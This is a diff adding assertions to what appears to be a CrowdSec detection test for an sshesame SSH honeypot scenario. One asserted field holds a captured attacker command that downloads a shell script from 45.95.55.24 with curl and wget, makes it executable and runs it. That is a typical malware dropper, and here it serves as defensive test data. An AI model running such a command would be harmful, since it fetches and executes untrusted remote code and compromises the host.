@@ -1,0 +1,16 @@
+len(results) == 1
+"64.31.47.254" in results[0].Overflow.GetSources()
+results[0].Overflow.Sources["64.31.47.254"].IP == "64.31.47.254"
+results[0].Overflow.Sources["64.31.47.254"].Range == ""
+results[0].Overflow.Sources["64.31.47.254"].GetScope() == "Ip"
+results[0].Overflow.Sources["64.31.47.254"].GetValue() == "64.31.47.254"
+results[0].Overflow.Alert.Events[0].GetMeta("command") == "cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh"
+results[0].Overflow.Alert.Events[0].GetMeta("datasource_path") == "sshesame.log"
+results[0].Overflow.Alert.Events[0].GetMeta("datasource_type") == "file"
+results[0].Overflow.Alert.Events[0].GetMeta("log_type") == "sshesame_cmd"
+results[0].Overflow.Alert.Events[0].GetMeta("service") == "sshesame"
+results[0].Overflow.Alert.Events[0].GetMeta("source_ip") == "64.31.47.254"
+results[0].Overflow.Alert.Events[0].GetMeta("timestamp") == "2022-04-16T20:45:49Z"
+results[0].Overflow.Alert.GetScenario() == "thespad/sshesame-cmd"
+results[0].Overflow.Alert.Remediation == true
+results[0].Overflow.Alert.GetEventsCount() == 1
